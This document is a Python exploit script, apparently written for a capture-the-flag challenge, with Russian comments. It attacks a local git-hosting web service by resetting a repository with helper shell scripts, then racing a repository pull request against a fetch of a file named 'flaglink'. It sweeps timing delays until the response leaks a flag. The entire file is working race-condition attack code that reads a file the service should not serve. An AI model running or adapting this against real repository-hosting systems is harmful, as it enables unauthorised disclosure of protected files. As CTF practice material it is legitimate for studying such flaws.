import subprocess
import asyncio
import httpx

BASE_URL = "http://localhost:8045"
USER = "MrVasya"
NAME = "test"
FILENAME = "flaglink"

DELAY_START = 0.7     # 0 секунд
DELAY_END = 1     # 0.9 секунд
STEP = 0.01         # 10 мс

FLAG = "FLAG"       # что ищем в теле


def run_script(path):
    subprocess.run(
        [path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True
    )


async def fetch_file(client, result_container):
    try:
        print("starting fetch file...")
        url = f"{BASE_URL}/repo/{USER}/{NAME}/file/{FILENAME}"
        r = await client.get(url)
        print("got file contents")
        if FLAG in r.text:
            result_container["success"] = True
            result_container["content"] = r.text
    except Exception:
        pass


async def trigger_update(client):
    try:
        url = f"{BASE_URL}/repo/{USER}/{NAME}/pull"
        data = {"remote": "origin", "branch": "main"}
        print('starting repo update')
        await client.post(url, data=data)
        print("repo updated")
    except Exception:
        pass


async def try_delay(delay):
    # Убираем флаг
    run_script("./remove_flag.sh")

    # Добавляем флаг
    run_script("./send_flag.sh")

    result = {"success": False, "content": ""}

    async with httpx.AsyncClient() as client:
        # Запускаем update и fetch_file почти одновременно с задержкой
        if delay <= 0:
            task_fetch = asyncio.create_task(fetch_file(client, result))
            await asyncio.sleep(-delay)
            task_update = asyncio.create_task(trigger_update(client))
        else:
            task_update = asyncio.create_task(trigger_update(client))
            await asyncio.sleep(delay)
            task_fetch = asyncio.create_task(fetch_file(client, result))

        # Ждём завершения обоих
        await asyncio.gather(task_update, task_fetch)

    return result


async def main():
    for delay in [DELAY_START + i * STEP for i in range(int((DELAY_END - DELAY_START) / STEP) + 1)]:
        print(f"Trying delay: {int(delay*1000)} ms")
        result = await try_delay(delay)
        if result["success"]:
            print(f"SUCCESS with delay {int(delay*1000)} ms")
            print(result["content"])
            break
        else:
            print(f"Failed with delay {int(delay*1000)} ms")


if __name__ == "__main__":
    asyncio.run(main())
